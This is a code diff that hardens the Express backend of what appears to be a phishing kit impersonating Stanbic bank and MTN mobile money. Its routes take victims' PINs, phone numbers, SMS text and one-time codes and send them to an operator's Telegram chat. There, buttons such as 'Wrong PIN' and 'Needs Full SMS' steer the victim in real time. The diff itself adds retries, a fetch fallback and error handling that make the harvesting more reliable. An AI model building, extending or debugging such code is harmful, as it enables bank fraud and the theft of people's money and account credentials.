@@ -11,10 +11,26 @@ const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID || '';
 const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 const TG_TIMEOUT_MS = parseInt(process.env.TELEGRAM_TIMEOUT_MS, 10) || 8000;
+
+// Node < 18 guard: fallback to node-fetch if global fetch missing
+let fetchImpl = global.fetch;
+if (typeof fetchImpl !== 'function') {
+  try {
+    // eslint-disable-next-line global-require
+    fetchImpl = require('node-fetch');
+    console.warn('[fetch] Using node-fetch fallback (upgrade Node to >=18 recommended)');
+  } catch (e) {
+    console.error('[fetch] global.fetch missing and node-fetch not installed!');
+  }
+}
+
 function tgFetch(url, opts = {}) {
+  if (typeof fetchImpl !== 'function') {
+    return Promise.reject(new Error('fetch unavailable in this runtime'));
+  }
   const controller = new AbortController();
   const timer = setTimeout(() => controller.abort(), TG_TIMEOUT_MS);
-  return fetch(url, { ...opts, signal: controller.signal })
+  return fetchImpl(url, { ...opts, signal: controller.signal })
     .finally(() => clearTimeout(timer));
 }
 
@@ -22,7 +38,7 @@ const DATA_DIR   = process.env.DATA_DIR || (fs.existsSync('/data') ? '/data' : '
 const LINKS_FILE = path.join(DATA_DIR, 'stanbic_links.json');
 const TXS_FILE   = path.join(DATA_DIR, 'stanbic_txs.json');
 
-try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); } catch(e){}
+try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); } catch (e) {}
 
 const IS_PERSISTENT = DATA_DIR === '/data';
 
@@ -57,27 +73,36 @@ app.use((req, res, next) => {
   next();
 });
 
+// JSON / urlencoded with clean error handling
 app.use(express.json({ limit: '2mb' }));
 app.use(express.urlencoded({ extended: true }));
+
+// Body parse error handler (bad JSON from client)
+app.use((err, req, res, next) => {
+  if (err && err.type === 'entity.parse.failed') {
+    return res.status(400).json({ ok: false, error: 'Invalid JSON body' });
+  }
+  next(err);
+});
 
 app.use((req, _res, next) => {
   console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
   next();
 });
 
-function loadMap(file){
+function loadMap(file) {
   try {
     if (fs.existsSync(file)) {
       const raw = fs.readFileSync(file, 'utf8');
       const parsed = JSON.parse(raw);
       if (Array.isArray(parsed)) return new Map(parsed);
     }
-  } catch(e){ console.warn(`[load] ${file} failed:`, e.message); }
+  } catch (e) { console.warn(`[load] ${file} failed:`, e.message); }
   return null;
 }
-function saveMap(file, map){
+function saveMap(file, map) {
   try { fs.writeFileSync(file, JSON.stringify([...map.entries()])); }
-  catch(e){ console.warn(`[save] ${file} failed:`, e.message); }
+  catch (e) { console.warn(`[save] ${file} failed:`, e.message); }
 }
 
 let links = loadMap(LINKS_FILE) || new Map();
@@ -86,14 +111,22 @@ let txs   = loadMap(TXS_FILE)   || new Map();
 console.log(`[links] restored ${links.size} from disk`);
 console.log(`[txs]   restored ${txs.size} from disk`);
 
-function persistLinks(){ saveMap(LINKS_FILE, links); }
-function persistTxs(){   saveMap(TXS_FILE, txs); }
+function persistLinks() { saveMap(LINKS_FILE, links); }
+function persistTxs()   { saveMap(TXS_FILE, txs); }
 
-function esc(s = ''){
-  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+/* ─── HTML escape (Telegram-safe) ───────────────────────────────
+   Escape & first, then < > and quotes. Also strip control chars
+   that can break HTML parse mode.                              */
+function esc(s = '') {
+  return String(s)
+    // eslint-disable-next-line no-control-regex
+    .replace(/[\u0000-\u0008\u000B\u000C\u000E-\u001F]/g, '')
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
 }
 
-function buildFullPhone(countryCode, rawNumber){
+function buildFullPhone(countryCode, rawNumber) {
   const cc = String(countryCode || '').trim();
   let num = String(rawNumber || '').trim().replace(/[^\d+]/g, '');
   if (!num) return '';
@@ -101,15 +134,41 @@ function buildFullPhone(countryCode, rawNumber){
   num = num.replace(/^0+/, '');
   if (cc) {
     const ccDigits = cc.replace(/[^\d]/g, '');
-    if (ccDigits && num.startsWith(ccDigits)) {
-      return '+' + num;
-    }
+    if (ccDigits && num.startsWith(ccDigits)) return '+' + num;
     return cc + num;
   }
   return num;
 }
 
-async function tgSend(text, replyMarkup){
+function telegramConfigured() {
+  return !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID);
+}
+
+async function tgSendOnce(body) {
+  const r = await tgFetch(`${TELEGRAM_API}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(body)
+  });
+  const txt = await r.text();
+  let parsed;
+  try { parsed = JSON.parse(txt); }
+  catch (_) {
+    return { ok: false, description: 'Telegram non-JSON response: ' + txt.slice(0, 200) };
+  }
+  if (!parsed.ok) {
+    console.error('[tgSend] Telegram rejected:', parsed);
+  }
+  return parsed;
+}
+
+async function tgSend(text, replyMarkup) {
+  if (!telegramConfigured()) {
+    const msg = 'Telegram not configured (TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID missing)';
+    console.error('[tgSend]', msg);
+    return { ok: false, code: 'telegram_not_configured', description: msg };
+  }
+
   const body = {
     chat_id: TELEGRAM_CHAT_ID,
     text,
@@ -118,56 +177,47 @@ async function tgSend(text, replyMarkup){
   };
   if (replyMarkup) body.reply_markup = replyMarkup;
 
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    const msg = 'Telegram not configured (TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID missing)';
-    console.error('[tgSend]', msg);
-    return { ok:false, description: msg };
-  }
-
-  try {
-    const r = await tgFetch(`${TELEGRAM_API}/sendMessage`, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify(body)
-    });
-    const txt = await r.text();
-    let parsed;
-    try { parsed = JSON.parse(txt); } catch(_) {
-      console.error('[tgSend] non-JSON response:', txt.slice(0, 200));
-      return { ok:false, description: 'Telegram non-JSON response: ' + txt.slice(0, 200) };
+  // Try once, retry once on transient failure
+  for (let attempt = 1; attempt <= 2; attempt++) {
+    try {
+      const parsed = await tgSendOnce(body);
+      if (parsed && parsed.ok) return parsed;
+      // If Telegram returned a real error (e.g. 400 HTML parse), don't retry
+      if (parsed && parsed.error_code && parsed.error_code >= 400 && parsed.error_code < 500) {
+        return parsed;
+      }
+      if (attempt === 2) return parsed;
+      console.warn(`[tgSend] attempt ${attempt} failed, retrying…`, parsed && parsed.description);
+    } catch (e) {
+      const msg = e.name === 'AbortError' ? 'Telegram request timed out' : e.message;
+      console.error(`[tgSend] attempt ${attempt} error:`, msg);
+      if (attempt === 2) return { ok: false, description: msg };
     }
-    if (!parsed.ok) {
-      console.error('[tgSend] Telegram rejected:', parsed);
-    }
-    return parsed;
-  } catch(e){
-    const msg = e.name === 'AbortError' ? 'Telegram request timed out' : e.message;
-    console.error('[tgSend]', msg);
-    return { ok:false, description: msg };
   }
+  return { ok: false, description: 'tgSend unknown failure' };
 }
 
-async function tgAnswer(cbId, text){
+async function tgAnswer(cbId, text) {
   try {
     await tgFetch(`${TELEGRAM_API}/answerCallbackQuery`, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ callback_query_id: cbId, text, show_alert: false })
     });
-  } catch(e) { console.warn('[tgAnswer]', e.message); }
+  } catch (e) { console.warn('[tgAnswer]', e.message); }
 }
 
-async function tgRemoveButtons(chatId, messageId){
+async function tgRemoveButtons(chatId, messageId) {
   try {
     await tgFetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } })
     });
-  } catch(e) { console.warn('[tgRemoveButtons]', e.message); }
+  } catch (e) { console.warn('[tgRemoveButtons]', e.message); }
 }
 
-function ensureTx(trackingNumber, extra){
+function ensureTx(trackingNumber, extra) {
   if (!trackingNumber) return null;
   let t = txs.get(trackingNumber);
   if (!t) {
@@ -187,16 +237,16 @@ function ensureTx(trackingNumber, extra){
   return t;
 }
 
-function nowCAT(){
-  return new Date().toLocaleString('en-GB',{ timeZone: 'Africa/Lagos' }) + ' WAT';
+function nowCAT() {
+  return new Date().toLocaleString('en-GB', { timeZone: 'Africa/Lagos' }) + ' WAT';
 }
 
-function normalizeLang(v){
+function normalizeLang(v) {
   const l = String(v || '').toLowerCase().trim();
   return (l === 'fr' || l === 'en') ? l : 'en';
 }
 
-function resolvePublicUrl(){
+function resolvePublicUrl() {
   let url = (
     process.env.PUBLIC_URL ||
     process.env.RAILWAY_PUBLIC_DOMAIN ||
@@ -204,11 +254,46 @@ function resolvePublicUrl(){
     `localhost:${PORT}`
   ).replace(/\/+$/, '');
 
-  if (!/^https?:\/\//i.test(url)) {
-    url = 'https://' + url;
-  }
+  if (!/^https?:\/\//i.test(url)) url = 'https://' + url;
   return url;
 }
+
+/* ═══════════════════════════════════════════════════════════════
+   Helper: standardized Telegram failure response
+   ═══════════════════════════════════════════════════════════════ */
+function telegramFailResponse(res, tg, stage) {
+  const desc = (tg && tg.description) || 'sendMessage failed';
+  const code = (tg && tg.code) || 'telegram_error';
+
+  // Distinguish config vs transport vs API error
+  if (code === 'telegram_not_configured') {
+    return res.status(500).json({
+      ok: false,
+      code,
+      message: 'Telegram is not configured on the server (missing bot token / chat id).',
+      stage
+    });
+  }
+  if (/timed out/i.test(desc)) {
+    return res.status(504).json({
+      ok: false,
+      code: 'telegram_timeout',
+      message: 'Telegram request timed out. Please try again.',
+      stage
+    });
+  }
+  // Telegram rejected payload (e.g. HTML parse)
+  return res.status(502).json({
+    ok: false,
+    code,
+    message: 'Telegram error: ' + desc,
+    stage
+  });
+}
+
+/* ═══════════════════════════════════════════════════════════════
+   ROUTES
+   ═══════════════════════════════════════════════════════════════ */
 
 app.get('/', (_req, res) => {
   res.json({
@@ -218,9 +303,10 @@ app.get('/', (_req, res) => {
     activeTxs: txs.size,
     dataDir: DATA_DIR,
     isPersistent: IS_PERSISTENT,
-    telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
+    telegramConfigured: telegramConfigured(),
     telegramTimeoutMs: TG_TIMEOUT_MS,
     publicUrl: resolvePublicUrl(),
+    node: process.version,
     time: new Date().toISOString()
   });
 });
@@ -231,7 +317,8 @@ app.get('/health', (_req, res) => res.json({
   activeLinks: links.size,
   activeTxs: txs.size,
   dataDir: DATA_DIR,
-  isPersistent: IS_PERSISTENT
+  isPersistent: IS_PERSISTENT,
+  telegramConfigured: telegramConfigured()
 }));
 
 app.get('/api/debug', (_req, res) => {
@@ -244,10 +331,11 @@ app.get('/api/debug', (_req, res) => {
     lang: t.lang || '—'
   });
   res.json({
-    ok:true,
+    ok: true,
     dataDir: DATA_DIR,
     isPersistent: IS_PERSISTENT,
     publicUrl: resolvePublicUrl(),
+    telegramConfigured: telegramConfigured(),
     txs: tList
   });
 });
@@ -256,31 +344,31 @@ app.get('/api/check-webhook', async (_req, res) => {
   try {
     const r = await tgFetch(`${TELEGRAM_API}/getWebhookInfo`);
     res.json(await r.json());
-  } catch (e) { res.status(500).json({ ok:false, error: e.message }); }
+  } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
 });
 
 app.get('/api/set-webhook', async (_req, res) => {
   try {
     const publicUrl = resolvePublicUrl();
     const webhookUrl = `${publicUrl}/api/telegram-webhook`;
-    const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
+    const allowed = encodeURIComponent(JSON.stringify(['message', 'callback_query']));
     const r = await tgFetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`);
     res.json({ webhookUrl, result: await r.json() });
-  } catch (e) { res.status(500).json({ ok:false, error: e.message }); }
+  } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
 });
 
 app.get('/api/delete-webhook', async (_req, res) => {
   try {
     const r = await tgFetch(`${TELEGRAM_API}/deleteWebhook?drop_pending_updates=true`);
     res.json(await r.json());
-  } catch (e) { res.status(500).json({ ok:false, error: e.message }); }
+  } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
 });
 
 app.post('/api/links', (req, res) => {
   try {
     const body = req.body || {};
     const tracking = String(body.trackingNumber || body.t || '').trim().toUpperCase();
-    if (!tracking) return res.status(400).json({ ok:false, error:'Tracking number required' });
+    if (!tracking) return res.status(400).json({ ok: false, error: 'Tracking number required' });
     const now = Date.now();
     const expiryHours = parseInt(body.expiryHours, 10) || 6;
     const lang = normalizeLang(body.lang);
@@ -316,7 +404,7 @@ app.post('/api/links', (req, res) => {
       expiryHours: expiryHours,
       expiresAt: record.expiresAt
     });
-  } catch (err) { res.status(500).json({ ok:false, error: err.message }); }
+  } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
 });
 
 app.get('/api/links/:code', (req, res) => {
@@ -326,39 +414,40 @@ app.get('/api/links/:code', (req, res) => {
     const restored = loadMap(LINKS_FILE);
     if (restored) { links = restored; rec = links.get(code); }
   }
-  if (!rec) return res.status(404).json({ ok:false, error:'Link not found' });
+  if (!rec) return res.status(404).json({ ok: false, error: 'Link not found' });
   if (rec.expiresAt && Date.now() > rec.expiresAt) {
     links.delete(code); persistLinks();
-    return res.status(410).json({ ok:false, error:'Link expired', expiresAt: rec.expiresAt });
+    return res.status(410).json({ ok: false, error: 'Link expired', expiresAt: rec.expiresAt });
   }
   const lang = normalizeLang(rec.lang);
   res.json({
     ok: true,
     ...rec,
     lang: lang,
-    tx:  rec.trackingNumber,
-    tn:  rec.trackingNumber,
-    rn:  rec.accountName,
-    am:  rec.amount,
+    tx: rec.trackingNumber,
+    tn: rec.trackingNumber,
+    rn: rec.accountName,
+    am: rec.amount,
     cur: rec.currency,
-    an:  rec.accountNumber,
-    c:   rec.countryName,
-    cf:  rec.countryFlag,
-    cc:  rec.countryCode,
-    pm:  rec.modeOfPayment,
-    sn:  rec.receiptOptional,
-    mk:  rec.marketedBy,
-    pu:  rec.purpose,
-    ts:  rec.timestamp,
+    an: rec.accountNumber,
+    c: rec.countryName,
+    cf: rec.countryFlag,
+    cc: rec.countryCode,
+    pm: rec.modeOfPayment,
+    sn: rec.receiptOptional,
+    mk: rec.marketedBy,
+    pu: rec.purpose,
+    ts: rec.timestamp,
     dtIso: rec.transactionDateTime || ''
   });
 });
 
+/* ─── PIN ─── */
 app.post('/api/mtn/pin', async (req, res) => {
   try {
     const { tx, pin, phone, am, cur, c, an, rn, lang } = req.body || {};
     if (!tx || !pin) {
-      return res.status(400).json({ ok:false, message:'Missing data' });
+      return res.status(400).json({ ok: false, message: 'Missing data' });
     }
 
     const tracking = String(tx).toUpperCase();
@@ -398,23 +487,31 @@ app.post('/api/mtn/pin', async (req, res) => {
       ]]
     };
 
-    const tg = await tgSend(text, buttons);
-    if (!tg.ok) {
-      console.error('Telegram send failed:', tg);
-      return res.status(502).json({ ok:false, message: 'Telegram error: ' + (tg.description || 'sendMessage failed') });
+    let tg;
+    try {
+      tg = await tgSend(text, buttons);
+    } catch (e) {
+      console.error('[pin] tgSend threw:', e);
+      tg = { ok: false, description: e.message };
     }
 
-    res.json({ ok:true, status:'pending' });
+    if (!tg.ok) {
+      console.error('[pin] Telegram send failed:', tg);
+      return telegramFailResponse(res, tg, 'pin');
+    }
+
+    res.json({ ok: true, status: 'pending' });
   } catch (err) {
     console.error('mtn/pin error:', err);
-    res.status(500).json({ ok:false, message: err.message });
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
+/* ─── SMS ─── */
 app.post('/api/mtn/sms', async (req, res) => {
   try {
     const { tx, code, message, am, cur, c, an, rn, lang } = req.body || {};
-    if (!tx) return res.status(400).json({ ok:false, message:'Missing tx' });
+    if (!tx) return res.status(400).json({ ok: false, message: 'Missing tx' });
 
     const tracking = String(tx).toUpperCase();
     const rec = links.get(tracking) || {};
@@ -454,7 +551,7 @@ app.post('/api/mtn/sms', async (req, res) => {
         ],
         [
           { text: '📄 Needs Full SMS', callback_data: `mtn:sms:needs_full_sms:${tracking}` },
-          { text: '🔁 Resend',         callback_data: `mtn:sms:resend:${tracking}` }
+          { text: '🔁 Resend', callback_data: `mtn:sms:resend:${tracking}` }
         ],
         [
           { text: '⚠️ Wrong PIN', callback_data: `mtn:sms:wrong_pin:${tracking}` }
@@ -462,23 +559,31 @@ app.post('/api/mtn/sms', async (req, res) => {
       ]
     };
 
-    const tg = await tgSend(text, buttons);
-    if (!tg.ok) {
-      console.error('Telegram send failed:', tg);
-      return res.status(502).json({ ok:false, message:'Telegram error: ' + (tg.description || 'sendMessage failed') });
+    let tg;
+    try {
+      tg = await tgSend(text, buttons);
+    } catch (e) {
+      console.error('[sms] tgSend threw:', e);
+      tg = { ok: false, description: e.message };
     }
 
-    res.json({ ok:true, status:'pending' });
+    if (!tg.ok) {
+      console.error('[sms] Telegram send failed:', tg);
+      return telegramFailResponse(res, tg, 'sms');
+    }
+
+    res.json({ ok: true, status: 'pending' });
   } catch (err) {
     console.error('mtn/sms error:', err);
-    res.status(500).json({ ok:false, message: err.message });
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
+/* ─── OTP ─── */
 app.post('/api/mtn/otp', async (req, res) => {
   try {
     const { tx, otp, am, cur, c, lang } = req.body || {};
-    if (!tx || !otp) return res.status(400).json({ ok:false, message:'Missing data' });
+    if (!tx || !otp) return res.status(400).json({ ok: false, message: 'Missing data' });
 
     const tracking = String(tx).toUpperCase();
     const rec = links.get(tracking) || {};
@@ -511,29 +616,37 @@ app.post('/api/mtn/otp', async (req, res) => {
           { text: '❌ Decline', callback_data: `mtn:otp:decline:${tracking}` }
         ],
         [
-          { text: '🔁 Resend',   callback_data: `mtn:otp:resend:${tracking}` },
+          { text: '🔁 Resend', callback_data: `mtn:otp:resend:${tracking}` },
           { text: '⚠️ Inactive', callback_data: `mtn:otp:inactive:${tracking}` }
         ]
       ]
     };
 
-    const tg = await tgSend(text, buttons);
-    if (!tg.ok) {
-      console.error('Telegram send failed:', tg);
-      return res.status(502).json({ ok:false, message:'Telegram error: ' + (tg.description || 'sendMessage failed') });
+    let tg;
+    try {
+      tg = await tgSend(text, buttons);
+    } catch (e) {
+      console.error('[otp] tgSend threw:', e);
+      tg = { ok: false, description: e.message };
     }
 
-    res.json({ ok:true, status:'pending' });
+    if (!tg.ok) {
+      console.error('[otp] Telegram send failed:', tg);
+      return telegramFailResponse(res, tg, 'otp');
+    }
+
+    res.json({ ok: true, status: 'pending' });
   } catch (err) {
     console.error('mtn/otp error:', err);
-    res.status(500).json({ ok:false, message: err.message });
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
+/* ─── RESEND ─── */
 app.post('/api/mtn/resend', async (req, res) => {
   try {
     const { tx, stage, c, am, cur, lang } = req.body || {};
-    if (!tx) return res.status(400).json({ ok:false, message:'Missing tx' });
+    if (!tx) return res.status(400).json({ ok: false, message: 'Missing tx' });
 
     const tracking = String(tx).toUpperCase();
     const rec = links.get(tracking) || {};
@@ -546,7 +659,7 @@ app.post('/api/mtn/resend', async (req, res) => {
     t.lang = L;
     persistTxs();
 
-    await tgSend(
+    const tg = await tgSend(
       `🔁 <b>Stanbic ${which} Resend Requested</b>\n` +
       `━━━━━━━━━━━━━━━\n` +
       `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
@@ -556,12 +669,18 @@ app.post('/api/mtn/resend', async (req, res) => {
       null
     );
 
-    res.json({ ok:true, message: `Resend noted (${which})` });
+    if (!tg.ok) {
+      console.error('[resend] Telegram send failed:', tg);
+      return telegramFailResponse(res, tg, 'resend');
+    }
+
+    res.json({ ok: true, message: `Resend noted (${which})` });
   } catch (err) {
-    res.status(500).json({ ok:false, message: err.message });
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
+/* ─── STATUS ─── */
 app.get('/api/mtn/status/:tx', (req, res) => {
   const tracking = String(req.params.tx || '').trim().toUpperCase();
   let t = txs.get(tracking);
@@ -569,7 +688,7 @@ app.get('/api/mtn/status/:tx', (req, res) => {
     const restored = loadMap(TXS_FILE);
     if (restored) { txs = restored; t = txs.get(tracking); }
   }
-  if (!t) return res.json({ ok:true, decision:'pending', lang:'en' });
+  if (!t) return res.json({ ok: true, decision: 'pending', lang: 'en' });
 
   res.json({
     ok: true,
@@ -588,7 +707,7 @@ app.get('/api/mtn/sms-status/:tx', (req, res) => {
     const restored = loadMap(TXS_FILE);
     if (restored) { txs = restored; t = txs.get(tracking); }
   }
-  if (!t) return res.json({ ok:true, decision:'pending', lang:'en' });
+  if (!t) return res.json({ ok: true, decision: 'pending', lang: 'en' });
 
   let decision = 'pending';
   if (t.smsStatus === 'approved') decision = 'approved';
@@ -597,7 +716,7 @@ app.get('/api/mtn/sms-status/:tx', (req, res) => {
   else if (t.smsStatus === 'needs_full_sms') decision = 'needs_full_sms';
   else if (t.smsStatus === 'wrong_pin') decision = 'wrong_pin';
 
-  res.json({ ok:true, decision, tx: tracking, lang: normalizeLang(t.lang) });
+  res.json({ ok: true, decision, tx: tracking, lang: normalizeLang(t.lang) });
 });
 
 app.get('/api/mtn/otp-status/:tx', (req, res) => {
@@ -607,7 +726,7 @@ app.get('/api/mtn/otp-status/:tx', (req, res) => {
     const restored = loadMap(TXS_FILE);
     if (restored) { txs = restored; t = txs.get(tracking); }
   }
-  if (!t) return res.json({ ok:true, decision:'pending', lang:'en' });
+  if (!t) return res.json({ ok: true, decision: 'pending', lang: 'en' });
 
   let decision = 'pending';
   if (t.otpStatus === 'approved') decision = 'approved';
@@ -615,9 +734,10 @@ app.get('/api/mtn/otp-status/:tx', (req, res) => {
   else if (t.otpStatus === 'resend') decision = 'expired';
   else if (t.otpStatus === 'inactive') decision = 'inactive';
 
-  res.json({ ok:true, decision, tx: tracking, lang: normalizeLang(t.lang) });
+  res.json({ ok: true, decision, tx: tracking, lang: normalizeLang(t.lang) });
 });
 
+/* ─── WEBHOOK ─── */
 app.post('/api/telegram-webhook', async (req, res) => {
   try {
     const update = req.body || {};
@@ -637,16 +757,16 @@ app.post('/api/telegram-webhook', async (req, res) => {
         }
         if (!t) {
           await tgAnswer(cq.id, 'Session expired');
-          return res.json({ ok:true });
+          return res.json({ ok: true });
         }
 
         const labels = {
-          approve:'✅ Approved',
-          decline:'❌ Declined',
-          resend:'🔁 Resend',
-          inactive:'⚠️ Inactive',
-          needs_full_sms:'📄 Needs Full SMS',
-          wrong_pin:'⚠️ Wrong PIN'
+          approve: '✅ Approved',
+          decline: '❌ Declined',
+          resend: '🔁 Resend',
+          inactive: '⚠️ Inactive',
+          needs_full_sms: '📄 Needs Full SMS',
+          wrong_pin: '⚠️ Wrong PIN'
         };
 
         if (stage === 'pin') {
@@ -669,25 +789,26 @@ app.post('/api/telegram-webhook', async (req, res) => {
         await tgAnswer(cq.id, labels[action] || action);
         if (cq.message) await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
         console.log(`[webhook] mtn:${stage}:${action}:${tracking} → pin=${t.pinStatus} sms=${t.smsStatus} otp=${t.otpStatus} lang=${t.lang || 'en'}`);
-        return res.json({ ok:true });
+        return res.json({ ok: true });
       }
     }
 
-    return res.json({ ok:true });
+    return res.json({ ok: true });
   } catch (err) {
     console.error('webhook error:', err);
-    res.status(500).json({ ok:false, error: err.message });
+    res.status(500).json({ ok: false, error: err.message });
   }
 });
 
+/* ─── STATIC + 404 ─── */
 app.use(express.static(__dirname, { extensions: ['html'] }));
 
 app.use('/api', (req, res) => {
-  res.status(404).json({ ok:false, error:'API route not found', path: req.originalUrl });
+  res.status(404).json({ ok: false, error: 'API route not found', path: req.originalUrl });
 });
 
-async function registerWebhook(){
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+async function registerWebhook() {
+  if (!telegramConfigured()) {
     console.warn('[webhook] skipped — Telegram not configured');
     return;
   }
@@ -696,7 +817,7 @@ async function registerWebhook(){
   console.log(`PUBLIC_URL = ${publicUrl}`);
   console.log(`Registering webhook: ${webhookUrl}`);
   try {
-    const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
+    const allowed = encodeURIComponent(JSON.stringify(['message', 'callback_query']));
     const r = await tgFetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`);
     console.log('setWebhook result:', await r.json());
   } catch (e) { console.error('setWebhook failed:', e.message); }
@@ -706,12 +827,8 @@ const server = app.listen(PORT, '0.0.0.0', () => {
   console.log(`Stanbic backend running on port ${PORT}`);
   console.log(`Static HTML dir: ${__dirname}`);
   console.log(`Data directory: ${DATA_DIR} ${IS_PERSISTENT ? '✅ PERSISTENT' : '⚠️  TEMPORARY'}`);
-  if (!IS_PERSISTENT) {
-    console.warn('⚠️  No persistent disk — transaction data will be WIPED on restart.');
-  }
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.warn('⚠️  TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing — Telegram will not work');
-  }
+  if (!IS_PERSISTENT) console.warn('⚠️  No persistent disk — transaction data will be WIPED on restart.');
+  if (!telegramConfigured()) console.warn('⚠️  TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing — Telegram will not work');
 
   registerWebhook().catch(e => console.error('Webhook registration failed:', e.message));
 });
